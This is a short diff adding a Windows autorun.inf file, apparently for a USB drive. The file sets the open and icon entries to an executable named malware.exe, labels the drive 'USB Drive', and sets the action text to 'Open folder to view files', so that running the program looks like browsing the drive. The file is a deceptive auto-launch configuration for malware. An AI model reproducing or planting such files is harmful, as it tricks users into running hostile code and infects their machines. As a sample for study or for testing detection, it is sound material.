@@ -1,0 +1,6 @@
+
+[autorun]
+open=malware.exe
+icon=malware.exe
+label=USB Drive
+action=Open folder to view files
